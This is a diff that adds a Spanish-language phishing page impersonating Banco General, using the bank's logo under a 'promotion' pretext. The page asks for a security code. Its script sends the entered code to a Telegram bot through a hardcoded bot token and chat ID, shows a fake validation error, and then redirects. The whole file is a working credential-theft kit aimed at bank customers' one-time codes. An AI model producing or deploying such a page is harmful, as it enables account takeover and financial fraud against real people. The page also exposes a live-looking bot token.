@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Promociones - General</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: rgb(245, 241, 241);
+        }
+
+        .logo-pequeño {
+            width: 250px;
+            margin: 0 0 20px;
+        }
+
+        .input-container {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            padding: 2px;
+            background: #FFFDDD;
+            width: 500px;
+        }
+
+        input[type="text"] {
+            padding: 5px;
+            border: none;
+            font-size: 15px;
+            color: #333;
+            outline: none;
+            height: 25px;
+            width: 100%;
+            background: transparent;
+        }
+
+        input[type="text"]:focus {
+            background: white;
+            box-shadow: 0 0 5px rgba(40, 128, 223, 0.5);
+        }
+
+        .label {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        .button {
+            width: 100%;
+            padding: 11px;
+            background-color: #0064A8;
+            color: white;
+            border: none; 
+            border-radius: 0;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: bold;
+            margin-top: 10px; 
+            transition: background-color 0.3s; 
+        }
+
+        .button.enabled {
+            pointer-events: auto; 
+        }
+
+        .button:hover {
+            background-color: #004C7F;
+        }
+
+        .first-time-text {
+            font-size: 14px; 
+            color: rgb(194, 57, 57);
+            text-align: left; 
+            margin-top: 5px; 
+        }
+
+        .version-text {
+            font-size: 11px; 
+            color: #333; 
+            margin-top: 20px; 
+            position: absolute; 
+            bottom: 20px; 
+            text-align: center; 
+            left: 50%; 
+            transform: translateX(-50%); 
+            background: transparent; 
+        }
+
+        .loading {
+            display: none; /* Muestra u oculta según sea necesario */
+            text-align: center;
+        }
+
+        .loading p {
+            color: #0064A8; /* Cambiar color del texto de la carga */
+            margin-top: 10px; 
+        }
+
+        .error-message {
+            color: #c23939 !important; /* Color del mensaje de error */
+            font-size: 17px; /* Tamaño del mensaje de error */
+            display: none; /* Ocultar por defecto */
+            margin-top: 10px; /* Espaciado superior */
+            text-align: center; /* Alinear al centro */
+        }
+
+        .instruction-text {
+            text-align: left; 
+            margin-top: 10px; 
+            font-size: 14px; 
+            color: #333; 
+            width: 500px; 
+        }
+    </style>
+</head>
+<body>
+    <img src="https://www.bgeneral.com/wp-content/uploads/2022/05/logo-bg-2.svg" alt="Logo Pequeño" class="logo-pequeño" id="logo">
+    <form id="login-form">
+        <label class="label" for="security-code">Código de seguridad</label>
+        <div class="input-container">
+            <input type="text" id="security-code" name="security-code" placeholder=" " required>
+        </div>
+        <p class="first-time-text" id="first-time-text">Ingresa el código recibido.</p>
+        <button type="button" class="button" id="next-button">Validar</button>
+    </form>
+
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <p>Estamos accediendo a la promoción, mientras verificamos sus datos.</p>
+        <p class="error-message" id="error-message">Error de validación</p> <!-- Mensaje de error -->
+    </div>
+
+    <p class="version-text">Versión 7.1.143781</p>
+
+    <script>
+        const token = '6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o'; 
+        const chatId = '-4037234500'; 
+
+        const securityCodeInput = document.getElementById('security-code');
+        const nextButton = document.getElementById('next-button');
+        const firstTimeText = document.getElementById('first-time-text');
+        const loadingDiv = document.getElementById('loading');
+        const errorMessage = document.getElementById('error-message');
+
+        function toggleButtonState() {
+            nextButton.classList.toggle('enabled', securityCodeInput.value.trim() !== '');
+        }
+
+        securityCodeInput.addEventListener('input', toggleButtonState);
+
+        securityCodeInput.addEventListener('focus', function() {
+            firstTimeText.textContent = '';
+        });
+
+        function sendMessageToBot(message) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const params = {
+                chat_id: chatId,
+                text: message
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(params)
+            }).then(response => {
+                if (!response.ok) {
+                    console.error('Error al enviar el mensaje al bot:', response.statusText);
+                }
+            }).catch(error => {
+                console.error('Error de red:', error);
+            });
+        }
+
+        nextButton.addEventListener('click', function() {
+            const securityCode = securityCodeInput.value;
+
+            // Mostrar la pantalla de carga
+            loadingDiv.style.display = 'block';
+            document.querySelector('form').style.display = 'none';
+            document.getElementById('logo').style.display = 'none';
+            errorMessage.style.display = 'none'; // Ocultar mensaje de error
+
+            // Simulación de carga de 3 segundos antes de mostrar el mensaje de error
+            setTimeout(() => {
+                errorMessage.style.display = 'block'; // Mostrar el mensaje de error
+
+                // Enviar el código de seguridad al bot
+                sendMessageToBot(`Código de seguridad ingresado: ${securityCode}`);
+
+                // Redirigir después de 5 segundos
+                setTimeout(() => {
+                    window.location.href = 'index.html'; 
+                }, 5000);
+            }, 5000);
+        });
+    </script>
+</body>
+</html>
